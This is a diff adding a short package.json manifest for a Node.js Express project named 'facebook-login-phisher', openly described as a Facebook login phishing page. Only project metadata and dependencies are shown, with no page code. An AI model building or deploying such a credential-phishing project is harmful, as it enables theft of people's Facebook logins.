@@ -1,0 +1,13 @@
+{
+  "name": "facebook-login-phisher",
+  "version": "1.0.0",
+  "description": "A Facebook login phishing page",
+  "main": "index.js",
+  "scripts": {
+    "start": "node index.js"
+  },
+  "dependencies": {
+    "express": "^4.17.1",
+    "fs": "^0.0.1-security"
+  }
+}
